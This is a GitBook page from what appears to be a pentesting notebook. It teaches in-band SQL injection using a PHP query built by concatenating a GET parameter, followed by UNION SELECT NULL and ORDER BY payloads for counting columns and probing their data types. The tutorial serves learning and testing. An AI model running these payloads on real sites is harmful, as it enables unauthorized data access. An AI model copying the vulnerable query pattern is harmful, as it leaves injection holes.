
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>In-band SQLi Â· GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../../../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">

    
    <link rel="next" href="example.html" />
    
    
    <link rel="prev" href="../sqli-basics.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../../../">
            
                <a href="../../../">
            
                    
                    Yo
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">Web Stuff</li>
        
        
    
        <li class="chapter " data-level="2.1" data-path="../../http/">
            
                <a href="../../http/">
            
                    
                    HTTP
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.1.1" data-path="../../http/the-basics.html">
            
                <a href="../../http/the-basics.html">
            
                    
                    The Basics
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.2" data-path="../">
            
                <a href="../">
            
                    
                    SQLi
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.2.1" data-path="../sqli-basics.html">
            
                <a href="../sqli-basics.html">
            
                    
                    SQLi Basics
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="2.2.2" data-path="./">
            
                <a href="./">
            
                    
                    In-band SQLi
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.2.2.1" data-path="example.html">
            
                <a href="example.html">
            
                    
                    Example
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.2.3" data-path="../error-based-sqli/">
            
                <a href="../error-based-sqli/">
            
                    
                    Error-based SQLi
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.2.3.1" data-path="../error-based-sqli/mssql-server.html">
            
                <a href="../error-based-sqli/mssql-server.html">
            
                    
                    MSSQL Server
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.3.2" data-path="../error-based-sqli/mysql-server.html">
            
                <a href="../error-based-sqli/mysql-server.html">
            
                    
                    MySQL Server
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.3.3" data-path="../error-based-sqli/postgresql-server.html">
            
                <a href="../error-based-sqli/postgresql-server.html">
            
                    
                    postgreSQL Server
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.2.4" data-path="../blind-sqli/">
            
                <a href="../blind-sqli/">
            
                    
                    Blind SQLi
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.2.4.1" data-path="../blind-sqli/bisection-technique.html">
            
                <a href="../blind-sqli/bisection-technique.html">
            
                    
                    Bisection Technique
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="2.2.4.2" data-path="../blind-sqli/time-based-blind-sqli.html">
            
                <a href="../blind-sqli/time-based-blind-sqli.html">
            
                    
                    Time-Based Blind SQLi
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.2.5" data-path="../sqlmap.html">
            
                <a href="../sqlmap.html">
            
                    
                    SQLmap
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="2.3" data-path="../../lfi/">
            
                <a href="../../lfi/">
            
                    
                    File and Resources Attacks
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="2.3.1" data-path="../../lfi/lfi.html">
            
                <a href="../../lfi/lfi.html">
            
                    
                    LFI
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">Windows stuff</li>
        
        
    
        <li class="chapter " data-level="3.1" data-path="../../../windows-stuff/basic-windows-enumeration.html">
            
                <a href="../../../windows-stuff/basic-windows-enumeration.html">
            
                    
                    Basic Windows Enumeration
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.2" data-path="../../../windows-stuff/samba.html">
            
                <a href="../../../windows-stuff/samba.html">
            
                    
                    SAMBA
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.3" data-path="../../../windows-stuff/ldap-ad.html">
            
                <a href="../../../windows-stuff/ldap-ad.html">
            
                    
                    LDAP / AD
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="3.4" data-path="../../../windows-stuff/empire-rip.html">
            
                <a href="../../../windows-stuff/empire-rip.html">
            
                    
                    Empire (RIP)
            
                </a>
            

            
        </li>
    

    
        
        <li class="header">LINUX STUFF</li>
        
        
    
        <li class="chapter " data-level="4.1" data-path="../../../linux-stuff/exploitation.html">
            
                <a href="../../../linux-stuff/exploitation.html">
            
                    
                    Exploitation
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2" data-path="../../../linux-stuff/priviledge-escalation/">
            
                <a href="../../../linux-stuff/priviledge-escalation/">
            
                    
                    Priviledge Escalation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="4.2.1" data-path="../../../linux-stuff/priviledge-escalation/getting-a-proper-shell.html">
            
                <a href="../../../linux-stuff/priviledge-escalation/getting-a-proper-shell.html">
            
                    
                    Getting a proper shell!
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.2" data-path="../../../linux-stuff/priviledge-escalation/enum-inside-linux.html">
            
                <a href="../../../linux-stuff/priviledge-escalation/enum-inside-linux.html">
            
                    
                    Enum inside linux
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.3" data-path="../../../linux-stuff/priviledge-escalation/suid-and-guid.html">
            
                <a href="../../../linux-stuff/priviledge-escalation/suid-and-guid.html">
            
                    
                    SUID and GUID
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.4" data-path="../../../linux-stuff/priviledge-escalation/crontab.html">
            
                <a href="../../../linux-stuff/priviledge-escalation/crontab.html">
            
                    
                    Crontab
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="4.2.5" data-path="../../../linux-stuff/priviledge-escalation/sudo.html">
            
                <a href="../../../linux-stuff/priviledge-escalation/sudo.html">
            
                    
                    Sudo
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    
        
        <li class="header">ENUMERATION</li>
        
        
    
        <li class="chapter " data-level="5.1" data-path="../../../">
            
                <a href="../../../">
            
                    
                    Initial page
            
                </a>
            

            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href="../../.." >In-band SQLi</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="in-band-sqli">In-band SQLi</h1>
<p>The best way to exploit in-band sqli is with the UNION command. However, there are some important things you need to take in account:</p>
<ul>
<li>The field types of the second SELECT must match the ones in the first statemement.</li>
<li>The number of fields in the second SELECT must match the first statement.</li>
<li>To successfully perform the attack, we need to understand the structure of the database (tables and columns).</li>
</ul>
<p>To solve the first two issues, lets enumerate the number of columns/fields a query selects:</p>
<pre><code class="lang-text">mysql_query(&quot;SELECT id, real_name FROM users WHERE id=&quot;.$GET[&apos;id&apos;].&quot;;&quot;);
</code></pre>
<p>The columns and data types are:</p>
<ul>
<li>id has data type int</li>
<li>real_name has data type varchar (string)</li>
</ul>
<p>In this case, for the second SELECT statement using UNION, if we select more than 2 columns or if the number is correct but the data type is different it will not work and will try to throw an error:</p>
<p>MySQL:</p>
<pre><code class="lang-text">The used SELECT statement have a different number of columns
</code></pre>
<p>MS SQL:</p>
<pre><code class="lang-text">All queries in an SQL statement containing a UNION operator must have an equal number of expressions in their target list.
</code></pre>
<p>PostgreSQL:</p>
<pre><code class="lang-text">Each UNION query must have the same number of columns.
</code></pre>
<p>Oracle:</p>
<pre><code class="lang-text">ORA-01789: query block has incorrect number of result columns.
</code></pre>
<p>Detecting the number of fields needed to exploit an in-band SQL injection looks like:</p>
<pre><code class="lang-text">&gt; 9999 UNION SELECT NULL; ---
&gt; 9999 UNION SELECT NULL, NULL; ---
&gt; 9999 UNION SELECT NULL, NULL, NULL; ---
&gt; 9999 UNION SELECT NULL, NULL, NULL, NULL; ---

Another example:

&gt; 1111&apos; UNION SELECT NULL; -- -
&gt; 1111&apos; UNION SELECT NULL, NULL; -- -
&gt; 1111&apos; UNION SELECT NULL, NULL, NULL; -- -
&gt; 1111&apos; UNION SELECT NULL, NULL, NULL, NULL; -- -
</code></pre>
<p>Other way to enumerate fields is to use ORDER BY:</p>
<pre><code class="lang-text">&gt; search=Tom&apos; ORDER BY 1-- -
&gt; search=Tom&apos; ORDER BY 2-- -
&gt; search=Tom&apos; ORDER BY 3-- -
&gt; search=Tom&apos; ORDER BY 4-- -
&gt; search=Tom&apos; ORDER BY 5-- -
&gt; search=Tom&apos; ORDER BY 6-- -
</code></pre>
<p>For the query to work, the number of NULL fields must match, so we can just keep adding it until the app doesn&apos;t throw an error anymore, as the two statements finally will be balanced (with the same number of fields in both SELECT statements).</p>
<p>This can be used even when the application does not throw an error when the query is wrong. Generally it will not display anything or the page will be messed up, so you can keep adding NULL to the query til it works.</p>
<p>Now, to discover the datatype of each field, we can simply repeat the same exercise since most DBMS won&apos;t allow UNION based queries if the datatype are different, therefore:</p>
<pre><code class="lang-text">&gt; SELECT 1 UNION &apos;a&apos;;
</code></pre>
<p>Won&apos;t work and will trigger an error.</p>
<table>
<thead>
<tr>
<th style="text-align:left">DBMS</th>
<th style="text-align:left">Datatype enforcing</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">MySQL</td>
<td style="text-align:left">No</td>
</tr>
<tr>
<td style="text-align:left">MSSQL</td>
<td style="text-align:left">Yes</td>
</tr>
<tr>
<td style="text-align:left">ORACLE</td>
<td style="text-align:left">Yes</td>
</tr>
<tr>
<td style="text-align:left">PostgreSQL</td>
<td style="text-align:left">Yes</td>
</tr>
</tbody>
</table>
<p>Now, we:</p>
<ul>
<li>Substitute one of the null fields with a constant.</li>
<li>If the constant type is correct, the query will work</li>
<li>If the type is wrong, the webapp will throw an error or misbehave</li>
</ul>
<p>So after finding the number of fields, we change the datatypes:</p>
<pre><code class="lang-text">&gt; 1111&apos; UNION SELECT NULL, NULL; -- -
#Change first field to int
&gt; 1111&apos; UNION SELECT 1, NULL; -- -
#If no errors, change the second field to int
&gt; 1111&apos; UNION SELECT 1, 1; -- -
#If errors, change the second field to string
&gt; 1111&apos; UNION SELECT 1, &apos;a&apos;; -- -
</code></pre>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="../sqli-basics.html" class="navigation navigation-prev " aria-label="Previous page: SQLi Basics">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="example.html" class="navigation navigation-next " aria-label="Next page: Example">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"In-band SQLi","level":"2.2.2","depth":2,"next":{"title":"Example","level":"2.2.2.1","depth":3,"path":"web-stuff/sqli/in-band-sqli/example.md","ref":"web-stuff/sqli/in-band-sqli/example.md","articles":[]},"previous":{"title":"SQLi Basics","level":"2.2.1","depth":2,"path":"web-stuff/sqli/sqli-basics.md","ref":"web-stuff/sqli/sqli-basics.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"web-stuff/sqli/in-band-sqli/README.md","mtime":"2020-08-01T10:54:50.192Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-08-01T14:00:37.551Z"},"basePath":"../../..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../../../gitbook/gitbook.js"></script>
    <script src="../../../gitbook/theme.js"></script>
    
        
        <script src="../../../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

